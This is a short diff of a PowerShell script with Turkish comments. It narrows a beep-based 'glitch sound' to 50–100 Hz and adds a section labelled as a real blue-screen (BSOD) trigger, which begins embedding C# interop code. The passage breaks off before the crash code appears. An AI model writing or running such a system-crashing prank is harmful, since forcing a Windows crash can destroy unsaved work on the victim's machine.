@@ -1,12 +1,14 @@
 Start-Sleep -Seconds 3
 
+# Glitch sesi (50-100 Hz sabit)
 for ($i=0; $i -lt 10; $i++) {
-    $freq = Get-Random -Min 50 -Max 2000
+    $freq = Get-Random -Min 50 -Max 100
     $dur = Get-Random -Min 50 -Max 300
     [System.Console]::Beep($freq, $dur)
     Start-Sleep -Milliseconds (Get-Random -Min 10 -Max 100)
 }
 
+# Gerçek BSOD tetikleme
 $code = @'
 using System;
 using System.Runtime.InteropServices;
